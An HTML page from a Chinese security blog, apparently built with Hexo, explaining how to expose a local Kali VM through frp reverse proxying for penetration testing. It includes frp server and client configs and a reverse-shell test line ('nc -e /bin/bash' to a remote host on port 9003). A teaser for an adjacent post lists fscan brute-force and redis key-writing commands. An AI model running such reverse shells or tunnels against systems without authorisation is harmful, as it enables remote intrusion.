@@ -1,0 +1,285 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>xyblog | xyblog</title><meta name="author" content="Xy"><meta name="copyright" content="Xy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="frp内网穿透—将kali代理在公网中进行渗透测试文章目录 * 前言   Frp简介 准备工具 实现内网穿透   * frp服务端配置   frp客户端配置   测试   * HTTP服务测试   ssh服务测试 反弹shell测试   注意    前言由于工作常需要用到kali，但是公网服务器并没有安装kali镜像，本地只安装了kali虚拟机，而msf渗透时常常需要反弹shell到kali中，但">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xyblog">
+<meta property="og:url" content="http://example.com/2025/07/15/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F_%E5%B0%86kali%E4%BB%A3%E7%90%86%E5%9C%A8%E5%85%AC%E7%BD%91%E4%B8%AD%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95_1/index.html">
+<meta property="og:site_name" content="xyblog">
+<meta property="og:description" content="frp内网穿透—将kali代理在公网中进行渗透测试文章目录 * 前言   Frp简介 准备工具 实现内网穿透   * frp服务端配置   frp客户端配置   测试   * HTTP服务测试   ssh服务测试 反弹shell测试   注意    前言由于工作常需要用到kali，但是公网服务器并没有安装kali镜像，本地只安装了kali虚拟机，而msf渗透时常常需要反弹shell到kali中，但">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/photo-1.jpg">
+<meta property="article:published_time" content="2025-07-15T09:06:42.678Z">
+<meta property="article:modified_time" content="2025-06-10T16:47:13.330Z">
+<meta property="article:author" content="Xy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/photo-1.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "",
+  "url": "http://example.com/2025/07/15/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F_%E5%B0%86kali%E4%BB%A3%E7%90%86%E5%9C%A8%E5%85%AC%E7%BD%91%E4%B8%AD%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95_1/",
+  "image": "http://example.com/img/photo-1.jpg",
+  "datePublished": "2025-07-15T09:06:42.678Z",
+  "dateModified": "2025-06-10T16:47:13.330Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Xy",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/07/15/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F_%E5%B0%86kali%E4%BB%A3%E7%90%86%E5%9C%A8%E5%85%AC%E7%BD%91%E4%B8%AD%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95_1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'xyblog',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/photo-2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/photo-1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></div><div class="menus_item"><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://butterfly.js.org/posts/4aa8abbe/#%E9%A0%82%E9%83%A8%E5%9C%96"><span> 連結</span></a></div><div class="menus_item"><a class="site-page" href="/Butterfly"><span> 來源</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/logo.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">xyblog</span></a><a class="nav-page-title" href="/"><span class="site-name">xyblog</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></div><div class="menus_item"><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://butterfly.js.org/posts/4aa8abbe/#%E9%A0%82%E9%83%A8%E5%9C%96"><span> 連結</span></a></div><div class="menus_item"><a class="site-page" href="/Butterfly"><span> 來源</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">无标题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-15T09:06:42.678Z" title="发表于 2025-07-15 17:06:42">2025-07-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-10T16:47:13.330Z" title="更新于 2025-06-11 00:47:13">2025-06-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="frp内网穿透—将kali代理在公网中进行渗透测试"><a href="#frp内网穿透—将kali代理在公网中进行渗透测试" class="headerlink" title="frp内网穿透—将kali代理在公网中进行渗透测试"></a>frp内网穿透—将kali代理在公网中进行渗透测试</h1><h4 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h4><ul>
+<li><pre><code>* 前言
+</code></pre>
+<ul>
+<li>Frp简介</li>
+<li>准备工具</li>
+<li>实现内网穿透</li>
+<li><pre><code>  * frp服务端配置
+</code></pre>
+<ul>
+<li>frp客户端配置</li>
+</ul>
+</li>
+<li>测试</li>
+<li><pre><code>  * HTTP服务测试
+</code></pre>
+<ul>
+<li>ssh服务测试</li>
+<li>反弹shell测试</li>
+</ul>
+</li>
+<li>注意</li>
+</ul>
+</li>
+</ul>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于工作常需要用到kali，但是公网服务器并没有安装kali镜像，本地只安装了kali虚拟机，而msf渗透时常常需要反弹shell到kali中，但内网中的kali并没有公网IP地址，因而可以 <strong>通过frp工具将 内网中的服务 映射到 公网IP地址的端口中</strong></p>
+<blockquote>
+<p>从前的日色变得慢，车，马，邮件都慢。</p>
+</blockquote>
+<h3 id="Frp简介"><a href="#Frp简介" class="headerlink" title="Frp简介"></a>Frp简介</h3><p>frp 是一个高性能的反向代理应用，采用C&#x2F;S架构(客户端&#x2F;服务端)，通过简单的配置能够将客户端中的tcp, udp, http, https 等协议隐射到服务端相应端口上，通过访问服务端对应的端口即能够访问到客户端对应的服务。<br>frp实现效果大致如下，通过访问公网服务器的某个端口即可访问到内网服务器中的某个服务<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8ea9dbcc6240952a9c82a5607f9c04b2.png" alt="在这里插入图片描述"></p>
+<h3 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h3><p>为了完成frp内外穿透，你需要准备好如下资源&#x2F;工具</p>
+<ul>
+<li>公网服务器，这里我用的是CentOS7.6</li>
+<li>frp服务端&#x2F;客户端工具，github下载</li>
+<li>内网服务器或本机，这里我用的是kali2020虚拟机</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp/releases">frp下载github链接</a><br><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">frp说明github链接</a><br>这里也提供amd64架构的<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1cLO2hI4t9wiJ4aAl0axUsw">网盘资源</a><br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1cLO2hI4t9wiJ4aAl0axUsw">https://pan.baidu.com/s/1cLO2hI4t9wiJ4aAl0axUsw</a><br>提取码：qwer<br><strong>frp工具服务端和客户端不需要分开下载，部署时选择服务端或客户端部署即可</strong></p>
+<h3 id="实现内网穿透"><a href="#实现内网穿透" class="headerlink" title="实现内网穿透"></a>实现内网穿透</h3><h4 id="frp服务端配置"><a href="#frp服务端配置" class="headerlink" title="frp服务端配置"></a>frp服务端配置</h4><p>首先将下载好的frp工具上传到服务器【这里我用的FinalShell可以直接上传文件】，如果不方便的话也可以用wget下载，tar命令解压如下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f027f1825235ff462d705db5c915d802.png" alt="在这里插入图片描述"></p>
+<pre><code>[common]
+# 一、服务器的基本配置部分
+# 7000 是FRP服务端口，可以改
+bind_port = 7000
+# dashboard_user和dashboard_pwd是FRP网页版管理员用户名密码，可以改。
+dashboard_user = admin
+dashboard_pwd = frpadmin@2022
+# 7500 是网页版管理端口：可以通过 http://服务器ip:7500登陆
+dashboard_port = 7500
+# 服务器和客户机之间的心跳连接
+heartbeat_timeout = 30
+#token设置，需要和客户端一致，客户端与服务端通过token进行认证，建议满足复杂度要求
+token=frpToken@admin2022
+ 
+# 二、添加的映射端口
+[common]
+# FRP服务器的公网ip
+server_addr = 【这里写自己的公网服务器地址】
+#例如：server_addr = 1.1.1.1
+
+# FRP服务器的，服务端口，这个可以改，不过客户端的也要一起改才行。
+server_port = 7000
+
+
+# 三、转发端口：[test01]、[test02] 这些没有任何意义，就是大致描述这个端口作用。
+# 每增加一个转发端口，复制下面的两行，然后将[]里面的和vhost_http_port_03改了就行了。
+#[test01]
+#vhost_http_port = 9001
+ 
+#[test02]
+#vhost_tcp_port = 1315
+#转发端口配置，实际测试这里影响不大，主要取决于客户端的配置
+vhost_http_port = 9001
+vhost_ssh_port = 9002
+vhost_tcp_port = 9003
+</code></pre>
+<p>启动frp服务端如下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/103b87b74ef1f95ea44a88c2a485c782.png" alt="在这里插入图片描述"></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/5d1a5440df66109578dc029ca6c57efb.png" alt="在这里插入图片描述"></p>
+<h4 id="frp客户端配置"><a href="#frp客户端配置" class="headerlink" title="frp客户端配置"></a>frp客户端配置</h4><p>同样的方式将frp工具上传到kali虚拟机中，这里要确保kali是能够正常联网的，同样用tar命令解压，配置frpc.ini文件如下：</p>
+<pre><code># 客户端配置
+[common]
+server_addr = 【这里写自己的公网服务器地址】
+#例如：server_addr = 1.1.1.1
+server_port = 7000          #frp服务端口要和服务端设定的一致
+token = frpToken@admin2022  #token要和服务端一致
+
+
+
+# 配置http服务，可用于小程序开发、远程调试等，如果没有可以不写下面的
+[web]
+type = http
+local_ip = 0.0.0.0
+local_port = 80   #本地需要映射的端口
+custom_domains = 【这里写自己的公网服务器地址】
+remote_port = 9001 #映射到服务端的端口
+
+#kali ssh
+[ssh]
+type = tcp
+local_ip = 0.0.0.0
+local_port = 22
+custom_domains = 【这里写自己的公网服务器地址】
+remote_port = 9002  
+
+#tcp msfconsole
+[tcp]
+type = tcp
+local_ip = 0.0.0.0
+local_port = 9003
+custom_domains = 【这里写自己的公网服务器地址】
+remote_port = 9003
+</code></pre>
+<p>kali上运行frp客户端如下，此时要确保frp服务端正常运行，看到我们配置的三个端口均正常映射，如果显示连接拒绝可以考虑在防火墙上放行对应端口<img src="https://i-blog.csdnimg.cn/blog_migrate/147dd9c563ad28dac001826c4ffdd066.png"></p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><h4 id="HTTP服务测试"><a href="#HTTP服务测试" class="headerlink" title="HTTP服务测试"></a>HTTP服务测试</h4><p>此时在kali上用python开启一个http服务进行测试</p>
+<pre><code>python3 -m http.server 80
+</code></pre>
+<p>http服务正常开启<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d3ccb7bf9a5f820d4da25a384a50031f.png" alt="在这里插入图片描述"></p>
+<p>至此，我们可以通过访问公网IP的对应端口来访问内网服务器中对应的服务</p>
+<h4 id="ssh服务测试"><a href="#ssh服务测试" class="headerlink" title="ssh服务测试"></a>ssh服务测试</h4><p>首先确保kali上正常开启了ssh服务，且frp服务端和客户端正常启动<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ad9b923eb068aa2a264eaf7df83eb5bd.png" alt="在这里插入图片描述"></p>
+<h4 id="反弹shell测试"><a href="#反弹shell测试" class="headerlink" title="反弹shell测试"></a>反弹shell测试</h4><p>在kali中利用msf工具时为了反弹shell常常需要设定本地监听端口，而虚拟机中的kali由于没有公网地址因此较难对公网中的服务器展开测试，通过frp代理很好的解决了这个问题<br>在上面的配置中，我配置了一个基于tcp的9003端口，映射到虚拟机kali的9003端口作为反弹shell的监听端口，这样就能够利用虚拟机kali对公网服务器进行测试，具体展开测试如下：<br>首先在kali上开启监听<br><img src="https://i-blog.csdnimg.cn/blog_migrate/36e973dd873c1627ca0070ec0029d5ec.png" alt="在这里插入图片描述"><br>接下来用另一台能联网的服务器反弹shell</p>
+<pre><code>nc -e /bin/bash 【frp服务器地址】 【frp映射TCP端口】
+例：nc -e /bin/bash 1.1.1.1 9003
+</code></pre>
+<p>执行命令后成功在kali中接收到shell<br><img src="https://i-blog.csdnimg.cn/blog_migrate/26cfe0c2f2b11100ad0773c645dcf1f2.png" alt="在这里插入图片描述"><br>当然这里也可以用msf生成payload进行测试，这里就不再继续演示</p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>利用frp穿透内网时需要注意，由于frp采用了C&#x2F;S架构，因此用户对于frp服务端映射端口的访问，在客户端看来都是本地的访问，相当于客户端的frp来访问自己的服务，再将流量转发出去，总结就是 <strong>frp客户端认为所有的访问均来自本地，不能知道真正的访问者IP</strong> ，frp服务端能够看到”真正”的访问者IP， <del>没准访问者也使用了代理</del><br>因此上面在访问HTTP或ssh时，kali虚拟机认为这些访问来自于本地的frp客户端，并不能知道真正的用户来自哪里，这对于frp客户端的安全策略将有更高的要求</p>
+<p>若有其他疑问，欢迎评论区留言或与我联系~</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Xy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/07/15/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F_%E5%B0%86kali%E4%BB%A3%E7%90%86%E5%9C%A8%E5%85%AC%E7%BD%91%E4%B8%AD%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95_1/">http://example.com/2025/07/15/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F_%E5%B0%86kali%E4%BB%A3%E7%90%86%E5%9C%A8%E5%85%AC%E7%BD%91%E4%B8%AD%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95_1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">xyblog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/photo-1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/15/fscan%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2"></div></div><div class="info-2"><div class="info-item-1">fscan工具的使用一、介绍1.简介fscan是一款用go语言编写的开源工具，一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。按照软件官方的说法，该工具支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis 批量写公钥、计划任务反弹 shell、读取 win 网卡信息、web 指纹识别、web 漏洞扫描、netbios 探测、域控识别等功能 2.命令介绍 cd fscan//进入fscan文件夹  //执行在windows下为fscan.exe,linux下为./fscan  //例如 ./fscan -h 192.168.101.1/24//启动fscan并扫描网段  fscan.exe -h 192.168.x.x //默认使用全部模块 fscan.exe -h 192.168.x.x -rf id_rsa.pub //redis 写私钥 fscan.exe -h 192.168.x.x -c whoami //ssh爆破成功后，命令执行 fscan.exe -h 192.168.x.x -m ms17010 //指定模块 fscan.exe -h 19...</div></div></div></a><a class="pagination-related" href="/2025/07/15/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F_%E5%B0%86kali%E4%BB%A3%E7%90%86%E5%9C%A8%E5%85%AC%E7%BD%91%E4%B8%AD%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2"></div></div><div class="info-2"><div class="info-item-1">frp内网穿透—将kali代理在公网中进行渗透测试文章目录 * 前言   Frp简介 准备工具 实现内网穿透   * frp服务端配置   frp客户端配置   测试   * HTTP服务测试   ssh服务测试 反弹shell测试   注意    前言由于工作常需要用到kali，但是公网服务器并没有安装kali镜像，本地只安装了kali虚拟机，而msf渗透时常常需要反弹shell到kali中，但内网中的kali并没有公网IP地址，因而可以 通过frp工具将 内网中的服务 映射到 公网IP地址的端口中  从前的日色变得慢，车，马，邮件都慢。  Frp简介frp 是一个高性能的反向代理应用，采用C&#x2F;S架构(客户端&#x2F;服务端)，通过简单的配置能够将客户端中的tcp, udp, http, https 等协议隐射到服务端相应端口上，通过访问服务端对应的端口即能够访问到客户端对应的服务。frp实现效果大致如下，通过访问公网服务器的某个端口即可访问到内网服务器中的某个服务 准备工具为了完成frp内外穿透，你需要准备好如下资源&#x2F;工具  公网服务器，这里我用的是Ce...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/photo-1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Xy</div><div class="author-info-description">xy的博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E2%80%94%E5%B0%86kali%E4%BB%A3%E7%90%86%E5%9C%A8%E5%85%AC%E7%BD%91%E4%B8%AD%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.</span> <span class="toc-text">frp内网穿透—将kali代理在公网中进行渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">文章目录</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.0.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Frp%E7%AE%80%E4%BB%8B"><span class="toc-number">1.0.2.</span> <span class="toc-text">Frp简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E5%85%B7"><span class="toc-number">1.0.3.</span> <span class="toc-text">准备工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">1.0.4.</span> <span class="toc-text">实现内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#frp%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%85%8D%E7%BD%AE"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">frp服务端配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#frp%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">frp客户端配置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">1.0.5.</span> <span class="toc-text">测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP%E6%9C%8D%E5%8A%A1%E6%B5%8B%E8%AF%95"><span class="toc-number">1.0.5.1.</span> <span class="toc-text">HTTP服务测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh%E6%9C%8D%E5%8A%A1%E6%B5%8B%E8%AF%95"><span class="toc-number">1.0.5.2.</span> <span class="toc-text">ssh服务测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E6%B5%8B%E8%AF%95"><span class="toc-number">1.0.5.3.</span> <span class="toc-text">反弹shell测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F"><span class="toc-number">1.0.6.</span> <span class="toc-text">注意</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/15/%E5%9F%BA%E4%BA%8EFRP%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%94%BB%E5%87%BB/" title="无标题">无标题</a><time datetime="2025-07-15T09:06:42.688Z" title="发表于 2025-07-15 17:06:42">2025-07-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/15/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA_%E4%B8%89_%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="无标题">无标题</a><time datetime="2025-07-15T09:06:42.686Z" title="发表于 2025-07-15 17:06:42">2025-07-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" 